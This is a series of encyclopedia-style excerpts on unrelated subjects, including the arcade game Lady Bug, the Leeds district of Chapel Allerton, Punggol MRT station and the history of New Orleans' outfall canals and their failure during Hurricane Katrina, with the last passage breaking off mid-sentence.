Machado was also one of the founders of the Partido Republicano Feminino (Women's Republican Party) in 1910,which advocated for the women's right to vote.  Life  Machado was born in 1893, in Rio de Janeiro. She started to write poetry as a child. At age 14 she participated of a literary contest held by the newspaper A Imprensa, winning the three main prizes with poems under her name and pseudonyms. The critics were scandalized by her poems, calling her an \\"immoral matron\\". Her first book of poems, Cristais partidos, was published in 1915. The book was prefaced by Olavo Bilac. The following years, she published the books: A revela√ß√£o dos perfumes (1916), Estado de alma (1917), Poesias (1915-1917)- (1918) and Mulher Nua, in 1922. In 1933 she won a contest by the magazine O Malho as the greatest Brazilian woman poet of the 20th century.

Its gameplay is similar to Pac-Man, with the primary addition to the formula being gates that change the layout of the maze when used. The arcade original was relatively obscure, but the game found wider recognition and success as a launch title for the ColecoVision console. Gameplay Arcade screenshot The goal of Lady Bug is to eat all \\"flowers,\\" hearts, and letters in the maze while avoiding other insects. The player is represented by a red, yellow, and green character resembling a ladybug while the enemy insects' appearance varies by level. The border of the maze acts as timer, with each circuit signaling the release of an enemy insect from the central area, up to (generally) a maximum of four. The speed of the circuit increases on stages 2 and 5. There are eight different enemy insects ‚Äî a different insect is introduced on each of the first eight levels. Beginning on level 9, each level has four different enemies. Unlike Pac-Man, the player can alter the layout of the maze by shifting any of the twenty green gates. It is not possible to completely isolate a portion of the maze through gate-shifting. When the fourth enemy insect enters the maze, the central area will show a level-specific vegetable. Eating a vegetable gives the player bonus points and immobilizes the enemy insects for several seconds, though touching them is still lethal. The randomly placed skull icons are lethal to ladybugs and enemy insects. An enemy insect who dies returns to the central area. Once a vegetable is eaten, the central area will remain empty unless an enemy insect dies and is re-released, revealing a new vegetable. A ladybug who dies will shrink from view and be briefly replaced with icons resembling the stereotypical wings and halo of an angel. The colors of the hearts and letters cycle through a short red, a middling yellow, and a longer blue. The point values are as follows: *Flower: 10 points (20, 30, or 50 points with appropriate multiplier) *Blue letter/heart: 100 points (200, 300, or 500 points with appropriate multiplier) *Yellow letter/heart: 300 points (600, 900, or 1500 points with appropriate multiplier) *Red letter/heart: 800 points (1600, 2400, or 4000 points with appropriate multiplier) *Vegetable: Starts at 1000 points, increases by 500 with each level to a maximum of 9500 points on level 18. Beyond this level, the vegetable's appearance (horseradish) and point value remain fixed. If a heart is consumed while it is blue, a point multiplier will come into effect, indicated by the blue section in the upper right corner of the screen. The first blue heart doubles all point values, the second triples them and the third quintuples them. This multiplier lasts until the level is complete. Eating hearts while they are yellow or red offers no benefit beyond the points collected. At each level, the maze will contain three letters. The first will be randomly selected from the set of {X, T, R} (which appear only in EXTRA), the second will be randomly selected from the set of {S, P, C, I, L} (which appear only in SPECIAL), and the third will be an A or an E (which appear in both words). A secondary goal of the player is to complete the words SPECIAL (indicated in red in the top left corner) and EXTRA (in yellow at top center). If, for example, a letter S is consumed while it is red, the corresponding letter in the word SPECIAL will change from grey to red. Eating an S while it is any other color (or if the S in SPECIAL is already red) offers no benefit beyond the points collected. Completing the word SPECIAL rewards the player with a free game, while completing EXTRA gives the player an extra life. Completing either word causes all its letters to return to normal and immediately advances the player to the next level. The vegetables associated with the first 18 levels and their corresponding point values are: 1 - cucumber (1000), 2 - eggplant (1500), 3 - carrot (2000), 4 - radish (2500), 5 - parsley (3000), 6 - tomato (3500), 7 - pumpkin (4000), 8 - bamboo shoot (4500), 9 - Japanese radish (5000), 10 - mushroom (5500), 11 - potato (6000), 12 - onion (6500), 13 - Chinese cabbage (7000), 14 - turnip (7500), 15 - red peper (8000) [note that the name is misspelled in the game], 16 - celery (8500), 17 - sweet potato (9000), 18 - horseradish (9500). The melody that plays when a new Lady Bug enters the maze is a snippet of a song called \\"Ladybug Samba\\". Ports Lady Bug was adapted to the home video game systems Intellivision and ColecoVision. In the ColecoVision version, completing SPECIAL puts the player into a bonus level (known in-game as a \\"Vegetable Harvest\\") where the goal is to consume as many randomly placed vegetables as possible within a fixed time. The SPECIAL register does not appear in the Intellivision version. In 1982, a catalog of Atari 2600 cartridges manufactured by Coleco said that an Atari 2600 version of Lady Bug would be released, but Coleco never released the game. Reception According to Electronic Games. Lady Bug did \\"just all right in the arcades\\". However, it was recognized for its originality within the maze game genre. In January 1983, the 1982 Arkie Awards gave it a Certificate of Merit as runner-up for Most Innovative Coin-Op Game.https://archive.org/stream/electronic-games- magazine-1983-01/Electronic_Games_Issue_11_Vol_01_11_1983_Jan#page/n35/mode/1up Creative Computing Video & Arcade Games said in 1983 that Lady Bug was not a Pac-Man clone, stating that the movable turnstiles \\"set it apart from all other maze games\\". The magazine reported that the ColecoVision version had become more popular than the arcade game at its office. It was reviewed in Video magazine in its \\"Arcade Alley\\" column where it was described as \\"a maze- chase game with all the high-speed action and thrills of Pac-Man combined with strategy-oriented play and pinball-style bonus features\\". The game's sound and graphics were reported to \\"equal, if not actually surpass, the original\\", and the reviewers particularly emphasized the innovative use of \\"color sequencing and the revolving turnstiles\\". The most significant criticism offered was that \\"the movement control is stiff and somewhat jerky\\". This version of the game was popular, winning the Videogame of the Year award in the \\"16K or more ROM\\" category at the 5th annual Arkie Awards where the judges described it as an \\"outstanding home edition of a coin-op-palace cult favorite\\". The game has received appreciation in later years, being praised by some as \\"the most challenging of the Pac-clones... It was, and still is, one of the best [of the clones].\\" Legacy Bumble Bee, a clone of Lady Bug A clone entitled Bumble Bee (replacing the main character with a bumblebee and the enemies with spiders) was released in 1983 and 1984 by Micro Power for the BBC Micro, Acorn Electron, and Commodore 64.

It sits within the Chapel Allerton ward of Leeds City Council and had a population of 18,206 and 23,536 at the 2001 and 2011 census respectively. The area was also listed in the 2018 Sunday Times report on Best Places to Live in northern England. Location Central Chapel Allerton street map. The region within the Chapel Allerton ward generally considered to be Chapel Allerton is bounded by Potternewton Lane to the south, Scott Hall Road to the west and Gledhow Valley Road to the northwest. Surrounding districts include Moortown, Meanwood, Roundhay, Gledhow, Chapeltown and Harehills. Chapel Allerton is on Harrogate Road, which, before the building of the A61 Scott Hall Road, was the main road from Leeds to Harrogate. The centre in terms of activity is Stainbeck Corner, at the junction of Stainbeck Lane, Harrogate Road and Town Street, which is also the key place on 19th century maps of the village. Name The name Chapel Allerton is first attested in the Domesday Book simply as Alreton and similarly spelled variants. It probably comes from Old English alor 'alder' (in its genitive plural form alra) and t≈´n 'estate, farm', thus meaning 'Alder farm'.A. H. Smith, The Place-Names of the West Riding of Yorkshire, English Place-Names Society, 30‚Äì37, 8 vols (Cambridge: Cambridge University Press, 1961‚Äì63), iv, 137‚Äì38.Harry Parkin, Your City's Place-Names: Leeds, English Place-Name Society City-Names Series, 3 (Nottingham: English Place-Names Society, 2017), p. 34. The Chapel part of the name refers to a chapel associated with Kirkstall Abbey. This building was demolished in the eighteenth century; the site remains between Harrogate Road and Church Lane. Already in 1240 a charter referred to land \\"which lies between the road which goes to the Chapel of Allerton and the bounds of Stainbeck\\",Holy Rosary Church Leeds Silver Jubilee 1937‚Äì1962 but the name Chapel Alreton is first attested in the fourteenth century, coined to distinguish the place from the many other places called Allerton, such as the nearby Allerton Gledhow and Moor Allerton. The name Chapel Allerton was reduced to Chapeltown (first attested in 1427), and from this time both names co-existed and were essentially interchangeable.R.

History In medieval times, the area was mostly small farms, but by the end of the seventeenth century, it had become a resort or second home for wealthy people from Leeds and in 1767 was described as the Montpellier of Yorkshire by one visitor. Chapel Allerton was incorporated into Leeds administrative area in 1869, as a civil parish. However, in 1900 it was still a village, isolated from Leeds and neighbouring Meanwood and Moortown by fields, which were gradually filled in with housing and new roads in the 20th century. Architecture Chapel Allerton is a conservation area for the character and historical interest of its buildings, noted for a diversity of good quality domestic buildings from various periods. The historic core is around Stainbeck Corner, particularly around Town Street and Well Lane, with 8 Listed buildings. To the south and west of this is an area of grand detached houses with large gardens dating from the 18th and early 19th century. The earlier buildings are of fine-grained sandstone derived from the quarries which were once on Stainbeck Lane. These include a number of small 19th century two-storey houses as well as grander buildings. After 1890 brick terraced and back-to-back houses were built, but of better quality than workers' housing elsewhere in Leeds, as they were intended for artisans and the lower middle class. The advent of the electric tram in 1901 made the area more accessible and further housing began to fill in empty spaces though this was of varied types. It finally lost its village character in the 1920s and it joined the Leeds urban area. Thus the area between King George Avenue and Montreal Avenue was filled in between 1920 and 1939 with bungalows and stucco-faced houses typical of Leeds of the time. In Riviera Gardens, white rendered houses were built in the Modernistic style. Dominion Cinema After the Second World War further building and rebuilding continued, mostly unremarkable, though with a few examples of good modern design. The area was once home to an art deco cinema, the Dominion. Opened in 1934 and lasting only until 1967 when it operated as a bingo hall until the later part of the 1990, the cinema stood on Montreal Avenue. The residential street 'Dominion Close' is close to its former site. =Houses= Allerton Hall was situated between Wensley Drive and Stainbeck Lane. In 1755 it was purchased by Josiah Oates, a merchant and an ancestor of Captain Laurence Edward Oates who perished in a blizzard at the age of 32 on the Terra Nova Expedition to the Antarctic led by Robert Falcon Scott in 1912. A brass plaque commemorates him in Leeds Parish Church. Most of the 60 bed mansion has since been demolished. The remaining parts of Allerton Hall is a grade II listed building. In the 1950s, the building was used by Twentieth Century Fox for the distribution of films across the North of England. Clough House on Stainbeck Lane was converted to the Mustard Pot pub in 1979. It may date to 1653, and thus one of the oldest inhabited houses in Leeds, though most of the structure is from 1700 onwards. On Wood Lane are Gothic style villas in sandstone dating from the second half of the 19th century for the middle classes. Methley Place is an example of late 19th century terraces for the artisan class. The Hawthorns are a set of terraces built in the early 1900s in an unusual Manorial style.

They are a grade II listed building. The style is dressed sandstone with ashlar details. The main corner doorway is flanked by Tuscan columns supporting a segmental pedimented hood containing a cartouche, and above this is a moulded and painted coat of arms of Leeds. The Harrogate Road doorways are Tudor- arched with rectangular fanlights. There is a bell turret and a clock. In 1904 the fire station was converted to a public library, with some amendments to the frontage style. The interior features tiled walls with 'LPL' on them, a mosaic floor in the entrance hall, stained glass in doors and ionic columns. Further down Harrogate Road in the direction of Leeds is a brick and sandstone building bearing the sign \\"Leeds Board School 1878\\". This is still a school, Chapel Allerton Primary School. It is on the site of the Chapeltown Moor gallows.

It replaced the old church set in the churchyard on Harrogate Road. By 1935 the old church had become so unsafe it was demolished. Russian Orthodox church services also take place there.Diocese of Sourozh, Parishes, accessed 10 October 2020 A Methodist church was built in 1877 on Town Street. It was replaced in 1983 by a smaller Methodist church and shops facing onto Harrogate Road. The Methodist Sunday School opposite, built in 1878, survives as a community centre. In January 2005, Chapel Allerton Methodist Church signed a local ecumenical covenant with St. Matthew's Church. Originally a congregation planted from Moortown Baptist Church, Chapel Allerton Baptist Church became an independent church in 2002.

This consists of a Co-op supermarket, http://findarticles.com/p/articles/mi_hb5245/is_/ai_n29376404 a post office, several banks, several restaurants as well as many pubs and bars. There is also a large Caffe Nero. More recently, a Starbucks has also been added in the former Yorkshire Bank building. There is a large Lidl store on Harrogate Road. There is also now a large Aldi, also on Harrogate Road, but more centrally located. The former police station is now an Indian restaurant, with the new police station further down Stainbeck Lane on the junction with Scott Hall Road. Originally called Chapeltown Police Station, it was renamed due to its misleading name to Stainbeck Police Station following the merger of two former divisions in 2006. Officially opened on 16 November 1998, Stainbeck Police Station was the divisional headquarters for the former North East Leeds division - this division has now been absorbed into the citywide policing district but continues to be one of the many police stations in the Leeds District. The fire station was converted into a public library in 1904. There are also many takeaways, a petrol station and many other independent shops. Many caf√©s, bars and restaurants utilise pavement space creating a pavement caf√© culture in the area. Some of the shops are chains, such as Greggs and Caffe Nero. There are however a significant number of thriving independent businesses, such as: \\\\- Opposite - cafe / coffee shop \\\\- Crust & Crumb - cafe / coffee shop \\\\- The Woods - bar & restaurant \\\\- Pinche Pinche - Mexican restaurant \\\\- Hern - bistro style restaurant \\\\- Dapur - Malaysian restaurant \\\\- Further North - bar Chapel Allerton has two arts centres: Inkwell Arts on Potternewton Lane and Seven Arts on Harrogate Road. Both provide concerts and community events and performances. The Chapel Allerton Arts Festival is held the week following August Bank Holiday each year, based around Regent Street.

It is the young men's branch of the community, particularly for those between the ages of 15 and 40. In some English-speaking countries, the organization is also known as the Ahmadiyya Muslim Youth Association (AMYA).  Foundation  Majlis Khuddam-ul-Ahmadiyya (MKA) was founded in 31 january 1938 by Khalifat-ul Masih II, Mirza Basheer-ud-Din Mahmood Ahmad, the second Caliph of the Ahmadiyya Muslim community. According to the auxiliary's founder, the name Khuddam-ul- Ahmadiyya literally means that its members are \\"servants of Ahmadiyya.\\" Mahmood Ahmad established the tenets of Majlis Khuddam-ul-Ahmadiyya to rest on the principles of service and sacrifice, and to inculcate commitment to one‚Äôs faith, one‚Äôs country, and to the world, tenets that still resonate through its international membership. The importance of Majlis Khuddam-ul-Ahmadiyya was so great that in 1940 membership was made compulsory for every young man between the ages of 15 and 40, and as a result, branches of Khuddam-ul-Ahmadiyya were established in all parts of the world.

The basic unit of account is an hour of service to an elderly person. Sometimes seniors help each other and earn the credits, other times family members in other communities earn credits and transfer them to their parents who live elsewhere. For example, an elderly woman who no longer has a driver‚Äôs license; if you shop for her, you get credit for that, based on the kind of service and the number of hours. These credits accumulate- users may keep them for when they become sick or elderly themselves, then use the credits in exchange for services. Alternatively, the users may transfer credits to someone else. A surprising part of the project has been that the elderly tend to prefer the services provided by people paid in Fureai Kippu over those paid in yen. This may be due to the personal connection. When they surveyed the elderly, it was clear they preferred the people who worked for Fureai kippu over the people who worked for yen because of the nature of the relationship. To convert this community service to yen would seem to dilute the community ethic. There are two clearinghouses that send the credits from one side of Japan to the other.

It is currently an interchange between the North East line (NEL) and Punggol LRT (PGLRT), and the only MRT station located within Punggol planning area, located near Punggol Temporary Bus Interchange and Waterway Point along Punggol Central. The station was completed on 20 June 2003 alongside the other NEL stations. It is currently the northern terminus on the North East line, until the expected completion of Punggol Coast station in 2023. By 2031, this station will be part of a future extension between the Pasir Ris and Punggol stations on the Cross Island line (CRL). History Contract 712 for the constructing of Punggol NEL station was awarded to Hock Lian Seng Group at a contract sum of S$85.86 million. The government gave the green light to construct the North East line in 1996. The station was constructed in tandem with the developments of Punggol New Town in 1999. The site of the station was in the middle of the forest, which was eventually cleared to make way for the construction. A track road was created to transport people and equipment to the site. In 2002, both of the LRT station and the MRT station were completed. Access roads of Punggol Central from Punggol Road were built at the same time. The station opened with the rest of the line in 20 June 2003. After finishing the construction of underground platforms at Punggol (at basement 2), construction began on the Punggol LRT in 2000, which had a middle platform on the LRT side (at level 2). The Punggol LRT station was opened on 29 January 2005 and served only the East Loop before the opening of the West Loop on 29 June 2014. On 27 February 2020, a power fault along the NEL resulted in service disruptions to the Punggol, Sengkang and Buangkok stations. At 5:36am, a shuttle train service was provided which operated on a single platform between the Punggol and Buangkok stations. In order to facilitate maintenance functions, the power source to the tracks between the Hougang and Punggol stations was switched off. Additionally, free regular and bridging bus services were provided to serve these stations. The repair works were completed by 11:49am and usual service along the entire NEL resumed at 12:14pm. Investigations later revealed that a broken contact wire affected the power source to trains launching from Sengkang Depot, causing the service disruptions. =Cross Island line Interchange= During the construction of the NEL station, a by box was already constructed beneath the NEL station to allow provisions for a possible future line. On 10 March 2020, the Land Transport Authority (LTA) announced that Punggol station would be an interchange station with the proposed Cross Island line (CRL). The station will be constructed as part of Punggol extension, consisting of four stations between Pasir Ris and Punggol, routed through Punggol Central and Lorong Halus, and is expected to be completed in 2031. Construction is expected to start in 2022.

They serve as the major draining conduits for a major portion of the metro area. There are three outfall canals in New Orleans, Louisiana ‚Äì the 17th Street, Orleans Avenue and London Avenue canals. These canals are a critical element of New Orleans‚Äô flood control system, serving as drainage conduits for much of the city. There are of levees and floodwalls that line the sides of the canals. The 17th Street Canal is the largest and most important drainage canal and is capable of conveying more water than the Orleans Avenue and London Avenue Canals combined. The 17th Street Canal extends north from Pump Station 6 to Lake Pontchartrain along the boundary of Orleans and Jefferson parishes. The Orleans Avenue Canal, between the 17th Street and London Avenue canals, runs approximately from Pump Station 7 to Lake Pontchartrain. The London Avenue Canal extends north from Pump Station 3 to Lake Pontchartrain about halfway between the Orleans Avenue Canal and the Inner Harbor Navigation Canal (also known locally as the Industrial Canal).  Outfall canal flood wall failures during Hurricane Katrina  When Hurricane Katrina made landfall on August 29 along the Louisiana and Mississippi coasts, storm surge from the Gulf of Mexico flowed into Lake Pontchartrain. The levees along the south shore of Lake Pontchartrain (including both Orleans and Jefferson Parish) withstood the elevated lake levels as designed. However, the floodwall structures along the three outfall canals failed in multiple locations. The floodwall along the 17th Street Canal‚Äôs east bank breached just south of the Old Hammond Highway Bridge. In addition, two major breaches occurred on both sides of the London Avenue Canal ‚Äì one on the west side near Robert E. Lee Boulevard and another on the east side near Mirabeau Avenue. The Orleans Avenue Canal‚Äôs floodwalls did not breach. On September 1, 2005, helicopters began dropping sandbags into the 17th Street Canal breach, and sheet piling was driven across the canal at the Old Hammond Highway Bridge. Sand bags were brought in and a sheet pile closure structure was built across the London Avenue Canal on September 3, 2005. Temporary pumps were later brought in to remove the water and drain the city, and the Orleans Metro sub-basin was officially declared dry on September 20, 2005. In total, the corps removed more than of water.\\"Sheet Pile Catalogy\\" In addition, the Corps replaced of floodwalls and of levees and repaired of scour damage following Hurricane Katrina. According to the American Society of Civil Engineers External Peer Review released June 1, 2007, the engineers responsible for the design of the outfall canal levees overestimated the soil strength, meaning that the soil strength used in the design calculations was greater than what actually existed under and near the levees during Hurricane Katrina. They made an unconservative (i.e., erring toward unsafe) interpretations of the data: the soil below the levee was actually weaker than that used in the I-wall design. A more recent study corroborates this findings and adds that the main reason the corps' engineers erred is because they misinterpreted the results of a large scale study they conducted in the Atchafalaya Basin in the mid-1980 in an attempt to limit project costs. The engineers wrongly concluded that sheet piles needed to be driven to depths of only 17 feet (1 foot 1‚ÅÑ4 0.3048 meters) instead of between 31 and 46 feet. That decision saved approximately US$100 million, but significantly reduced overall engineering reliability. The Orleans Avenue Canal outfall canal did not breach because it had an accidental spillway which relieved pressure and allowed water to flow out of the canal. In 2007, the United States Army Corps of Engineers published results from a year-long study intended primarily to determine the canal's \\"safe water level\\" for the 2007 hurricane season. The Corps of Engineers divided the of walls and levee into 36 sections to analyze just how much storm surge each can withstand. It found that only two sections, those closest to Pump Station No. 6 and on the high ground of Metairie Ridge, can hold more than of water. Many other sections of walls and levees can't be counted on to contain more than of water.  New Orleans hydrology  New Orleans is situated between the Mississippi River to the south and Lake Pontchartrain to the north and is approximately upstream from the mouth of the Mississippi River. The Orleans Metro drainage sub-basin. Nearly all water in this sub-basin is eventually drained into the outfall canals. Over the years, humans have altered the hydrology of New Orleans to keep floodwaters out of the city, remove floodwater from within the city, improve navigation and / or shore up land. Keeping floodwaters out of New Orleans motivated the region‚Äôs most influential landscape manipulation: the erection of artificial levees on the crown of natural levees to prevent overbank flooding. These levees were first built along the Mississippi River and then later along Lake Pontchartrain to prevent inundation of the city from the rear. As navigation and drainage canals were dug throughout the city and as more levees were constructed, the natural hydrological basin was subdivided into several smaller drainage sub-basins. One of these sub-basins, referred to as ‚ÄúOrleans Metro‚Äù by the Corps of Engineers, today includes the most densely populated portion of New Orleans and is bound by Lake Pontchartrain to the north, the Mississippi River to the south, the Inner Harbor Navigation Canal to the east and the 17th Street Outfall Canal / Jefferson Parish line to the west (although a small portion of Jefferson Parish along the Mississippi River, known as Hoey‚Äôs Basin, is also included in this sub-basin). This sub-basin includes such well-known neighborhoods as the French Quarter, the Garden District, Uptown, Lakeview and Gentilly. Fifty percent of New Orleans lies below sea level, so the city relies on manually operated pumps to remove rainwater from the land. The 17th Street, Orleans Avenue and London Avenue outfall canals serve as the main water expulsion routes for the Orleans Metro basin. During heavy rain and tropical weather events, drainage pumps operated by the Sewerage and Water Board of New Orleans pump rainwater out of the Orleans Metro sub-basin through a system of covered and open-channel drainage canals and into the three outfall canals and Lake Pontchartrain.\\"U.S. Army Corps of Engineers, Outfall Canals and Closure Structures\\"  History of the outfall canals  = Early history = An historical look at the City of New Orleans in 1878. The outfall canals were already constructed and included, from west to east, the 17th Street Canal, the Orleans Avenue Canal and the London Avenue Canal. New Orleans was founded in 1718 by Jean-Baptiste Le Moyne, Sieur de Bienville, along the high ground adjacent to the Mississippi River (about above sea level). The city struggled early on with rainfall drainage because of the topography of the region. The Metairie and Gentilly ridges, both about 3‚Äì4 feet above sea level and located between the Mississippi River and Lake Pontchartrain, made it difficult for rainwater to move out of the city since the water would have to flow over these ridges in order to be drained northward into Lake Pontchartrain. Bayou St. John, a natural bayou and old navigation channel that ran from the northern edge of the French Quarter north to Lake Pontchartrain (today it runs from the Mid- City neighborhood to Lake Pontchartrain), was not enough to drain the often heavy rainfall that occurred. With drainage and rainfall-related flood protection a huge concern, man-made canals were constructed by the mid-19th century. Drainage machines and pumps were built to lift the drained water over the high ridges and into the outfall canals. By 1878, there were approximately of drainage canals feeding into Lake Pontchartrain to remove rainwater from populated areas. Today there are of covered drainage canals, of open channel canals and several thousand miles of storm sewer lines that feed into the system. These early primary drainage canals included (from west to east): 17th Street, Orleans Avenue and London Avenue. As the population expanded northward toward the lake, low-lying swamps were reclaimed by constructing shallow drainage ditches that fed into the newly created system of drainage canals. However, the reduction in the groundwater table, as a result of the drainage and reclamation of swamps and marshland, produced significant land subsidence in the drained area. That land subsidence continues today. The construction of the outfall canals did have another major consequence. By digging canals through the Metairie and Gentilly ridges, the canals opened up storm surge avenues into the heart of New Orleans via Lake Pontchartrain. A hurricane in 1947 overwhelmed the existing levees along the outfall canals. Here, the 17th Street Canal is breached by hurricane storm surge. The New Orleans Sewerage and Water Board, which was established in 1899, became the primary agency that tackled the tough drainage problems facing New Orleans. Flood protection levee upkeep, including those along the outfall canals, was done locally by the Sewerage and Water Board and the Orleans Levee District, the latter of which is a state agency established in 1890 to handle the operation and maintenance duties associated with levees, floodwalls, and other hurricane and flood protection structures surrounding the city of New Orleans. In 1915 and again in 1947, devastating hurricanes struck the New Orleans area, causing millions of dollars in property damage and killing hundreds of residents. Water overtopped and breached the levees along the outfall canals and the Sewerage and Water Board and the Orleans Levee District raised the levees an estimated three feet after those hurricanes. However, some of these levees had subsided by as much as during their nearly 100-year existence. = Early federal involvement = The first federal involvement with hurricane protection in New Orleans began in 1955 with Public Law 71 of the 84th Congress, 1st Session, when Congress authorized the Secretary of the Army to examine and survey the eastern and southern seaboards of the United States, with an emphasis on those areas where severe hurricane damages had occurred in the past. This authorization was granted after several hurricanes in 1954 severely damaged portions of the eastern and southern U.S. Although this authorization marked the first federal involvement with hurricane protection in the city, it authorized only a feasibility study and did not authorize or fund any construction-related activities.Interim Survey Report, Lake Pontchartrain, Louisiana and Vicinity. New Orleans: U.S. Army Corps of Engineers, 1962. Print The Lake Pontchartrain & Vicinity system, which includes much of southeast Louisiana. As part of the authorization, the New Orleans District of the U.S. Army Corps of Engineers examined the Lake Pontchartrain and Vicinity area of coastal Louisiana, which includes most of St. Bernard Parish, Orleans Parish east of the Mississippi River (including most of the City of New Orleans), Jefferson Parish east of the Mississippi River and a small portion of St. Charles Parish east of the Mississippi River. The Lake Pontchartrain and Vicinity area encompasses one large natural drainage basin that today includes the Orleans Metro sub-basin. After seven years of planning, the New Orleans District produced an Interim Survey Report, which was transmitted by the Secretary of the Army to the U.S. Congress in November 1962. This report outlined a comprehensive plan for preventing flooding in the greater New Orleans area from a Standard Project Hurricane, which is a hypothetical hurricane representing the most severe combination of hurricane parameters that is reasonably characteristic of the area. This report‚Äôs recommended protection plan for Lake Pontchartrain and Vicinity consisted of a barrier at the east end of Lake Pontchartrain. The barrier would include locks in the Rigolets and Chef Menteur Pass, as well as a lock in the Inner Harbor Navigation Canal at its confluence with Lake Pontchartrain (in the Seabrook area). The locks would limit hurricane storm surges from entering into Lake Pontchartrain and reduce high-salinity flows into the lake from the Gulf of Mexico via the Mississippi River-Gulf Outlet (MRGO), which was under construction at the time. As part of this original ‚ÄúBarrier Plan,‚Äù the existing levees along all three outfall canals were deemed adequate for hurricane protection purposes. = Hurricane Betsy = In September 1965, Hurricane Betsy struck the Louisiana coast near New Orleans, causing massive property damage and loss of life. While Betsy had similar characteristics of the Standard Project Hurricane, Betsy‚Äôs wind field and associated wave action called into question the adequacy of the original design heights for project levees and floodwalls outlined in the 1962 Interim Survey Report. As a result, the New Orleans District requested and received permission from the Corps‚Äô Mississippi Valley Division and Corps Headquarters to increase levee and floodwall heights by 1‚Äì2 feet across the project network. In addition, a Design Memorandum issued in 1968 revealed that the outfall canals needed to be addressed because the existing canal levees did not meet the design heights required by federal design criteria adopted after Hurricane Betsy. However, no immediate guidance was given as to how to increase flood protection along the canals and it remained an unresolved issue for over two decades. Congress authorized the post-Hurricane-Betsy-modified Barrier Plan when the Flood Control Act of 1965 was passed, positioning the federal government to assume 70 percent of construction costs. After authorization, the New Orleans District set out to develop detailed engineering plans, secure the required funding and real estate, and construct project features. The District initially estimated that the project would be complete by the mid-to-late 1970s. State governmental elected officials, congressional representatives and various local citizen and interest groups met the Barrier Plan with opposition. Some opponents feared that the barrier would adversely affect navigation access to the lake, while others cited the possible flooding of the north shore of Lake Pontchartrain when the barriers were closed. Also a concern was potential operation and maintenance costs. It was the environmental effects of the barrier, however, that caused the most opposition. As part of the National Environmental Policy Act (NEPA), the New Orleans District prepared an Environmental Impact Statement (EIS) to address environmental impacts associated with the project and how the Corps would mitigate those impacts. In 1975, a local environmental advocacy group challenged the adequacy of the 4-page typewritten EIS in U.S. District Court. Judge Charles Schwartz issued an injunction preventing further progress on the barrier option until the Corps revised its EIS. He also wrote, however, that upon proper compliance with NEPA, ‚Äòthe injunction shall be dissolved and any hurricane plan thus properly presented will be allowed to proceed‚Äô. In other words, the Judge invited the Corps to return with a more comprehensive EIS. Ultimately, however, the Corps did not return and, in 1980, concluded that an alternative option of higher levees providing hurricane protection was less costly, less damaging to the environment and more acceptable to local interests. Hurricane protection floodwalls are installed along the Inner Harbor Navigation Canal in 1968. In 1985, the Director of Civil Works approved increasing levee heights along the lakefront. Construction of other non- barrier features continued as part of the original authorization. With the adoption of the High Level Plan, the New Orleans District could now move forward with providing hurricane and storm surge protection features along the lakefront and outfall canals. = Determining a specific hurricane protection plan for the outfall canals = Beginning in the late 1970s, the Corps‚Äô New Orleans Board (OLB) began identifying and examining hurricane protection alternatives for the outfall canals. Through a series of Design Memorandums in the late 1980s and early 1990s, the Corps recommended building a prototype gate plan employing self-actuating butter-fly check valves at the Orleans Avenue and London Avenue canals. Butterfly gates are hydraulically operated gates that swing on a pivot and close if storm surge threatens to enter the canals. (It is instructive to note that the gates alternative did not include auxiliary pump stations like those installed after Hurricane Katrina.) For the 17th Street Canal, the cost of a butterfly gate structure was about the same as the cost of the locally preferred plan of higher parallel levees along each side of the canal, so the corps agreed to pursue ‚Äúparallel protection‚Äù along that canal. There is no stated evidence in the project record that the corps felt that there were differences between the approaches in providing reliable surge protection (Woolley Shabman, 2‚Äì48). However, for the much smaller capacity London and Orleans Avenue Canals, the corps preferred the gates-no- pumps plan because it was significantly less expensive. The parallel protection plan was estimated in the 1980s to cost three times more than the gates plan for the London Avenue Canal and cost five times more than the gates plan for the Orleans Avenue Canal. The OLB and the Sewerage and Water Board, however, favored parallel protection for the Orleans Avenue and London Avenue outfall canals because they believed interior drainage would be inhibited when the gates were closed during a tropical event because water would not be able to escape from the canals and into Lake Pontchartrain. As interior drainage was not part of the federal authorization for hurricane protection, the OLB and the Sewerage and Water Board would be responsible for any costs associated with pump installation at the mouths of the outfall canals. The OLB and Sewerage and Water Board contended that parallel protection could provide increased hurricane storm surge protection while maintaining interior drainage. The Corps argued that the butterfly gates plan for the Orleans Avenue and London Avenue canals because they considered it their mandate to build projects with the most favorable cost benefit ratios. Cost was the pre- eminent factor. There is nothing in the project record indicating that the gates-only plan was the superior option, only that it was less expensive. For several years the project was at a stalemate. The local sponsor successfully lobbied Congress to direct the corps to implement the much more expensive parallel protection plan for all three outfall canals, not just the 17th Street Canal, in the Water Resources Development Act of 1990. Two years later, Congress stipulated that the federal government would pay 70 percent of the cost, with the local sponsor picking up the other 30 percent, in the Energy and Water Development Appropriations Act of 1992. With the dispute over hurricane protection solutions for the outfall canals seemingly resolved, the Corps began designing and constructing predominantly ‚ÄúI-wall‚Äù-type floodwalls on top of the levee crowns. I-walls met the project goals of providing increased embankment heights within the limited existing rights-of-way with minimal disruption to the adjacent residential neighborhoods. Construction began in 1993, and project work along the outfall canals was reported to be nearing completion in 2005 prior to Hurricane Katrina. Floodwalls were built instead of levees to protect against flooding because many homes, pictured here, back up to the levees. Any widening of the levees would be nearly impossible given the limited right of way.  Closure structures  Interim Closure Structures were built at the mouths of the three outfall canals following Hurricane Katrina to block storm surge from entering the canal. Pictured here is the Interim Closure Structure at the Orleans Avenue Canal. USACE Photo by Paul Floro. Despite the dewatering and rapid pace of repairs, the Corps of Engineers determined that it did not have the time to complete repairs to all of the breaches along the outfall canals before the start of the 2006 hurricane season. As a result, the Corps built interim gated closure structures at the mouths of all three canals to prevent storm surge from entering the canals. The Corps also initially installed 34 temporary pumps near the closure structures to drain floodwaters from the sub-basin. The gated structures stay open during normal, non-tropical conditions. When storm surge threatens to exceed the maximum operating water level of a canal, the Corps closes the gates and operates the pumps. Interior pumps operated by the Sewerage and Water Board pump rainwater out of the sub-basin and into the outfall canals. The interim pumps then pump rainwater out of the outfall canals, around the gates and into Lake Pontchartrain. The closed gates reduce the risk of storm surge entering the canals and threatening the city. When the surge recedes to a safe level, the gates are reopened and normal drainage resumes. The Corps received authorization to build the interim closure structures under emergency flood control legislation passed in September 2005, specifically Public Law 109-61 and Public Law 109-62. It cost about $400 million to build the interim closure structures. The Corps did not have the authority, however, to build permanent canal closures and pumps under this legislation. It was not until emergency appropriations in the years after Hurricane Katrina that the Corps received authorization to build the permanent gates and pumps. This authority superseded any previous legislation prior to Hurricane Katrina that prohibited the Corps from building closure structures at the mouths of the outfall canals. The appropriations for this project total about $804 million. In the years since Hurricane Katrina, the Corps of Engineers has been constructing and bolstering of 